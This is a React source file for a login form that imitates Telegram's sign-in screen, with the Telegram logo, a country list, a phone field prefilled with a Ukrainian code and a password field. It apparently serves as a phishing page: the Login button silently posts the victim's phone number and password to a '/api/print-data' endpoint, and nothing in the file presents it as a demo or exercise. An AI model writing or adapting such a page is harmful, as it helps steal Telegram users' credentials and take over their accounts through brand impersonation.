import { useState } from "react";
import "./TelegramLogin.css";
import tg_logo from '../assets/tg-ico.png';

export default function LoginForm() {
    const [userData, setUserData] = useState({ username: "", password: "" });

    function clickHandler() {
        fetch("/api/print-data", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(userData)
        }).then(response => {
            if (response.status === 200) {
                // alert("Data sent!");
            } else {
                // alert("Error!");
            }
        });
    }

    return (
        <div className="page" >
            <div className="form">
                <p className='logo'>
                    <img src={tg_logo} alt="Tg Logo" />
                </p>
                <h1 className="logo">Telegram</h1>
                <div className="form-title">
                    Please confirm your country code and enter your phone number.
                </div>

                {/* Country */}
                <div className="field">
                    <label className="label">Country</label>
                    <div className="select-wrapper">
                        <select className="select">
                            <option>Ukraine</option>
                            <option>Poland</option>
                            <option>Germany</option>
                        </select>
                    </div>
                </div>

                {/* Phone */}
                <div className="field">
                    <label className="label active">Your phone number</label>
                    <input
                        className="input active"
                        type="text"
                        defaultValue="+380"
                        onChange={event => setUserData(prevUserData => ({ ...prevUserData, username: event.target.value }))}
                    />
                </div>

                {/* Phone */}
                <div className="field">
                    <label className="label active">Your password</label>
                    <input
                        className="input active"
                        type="password"
                        onChange={event => setUserData(prevUserData => ({ ...prevUserData, password: event.target.value }))}
                    />
                </div>

                <div className="field" style={{textAlign: "center"}}>
                    <button onClick={clickHandler}>Login</button>
                </div>

                {/* Checkbox */}
                <label className="checkbox">
                    <input type="checkbox" defaultChecked />
                    <div className="checkbox-box"></div>
                    <span>Keep me signed in</span>
                </label>
            </div>
        </div>
    );
}
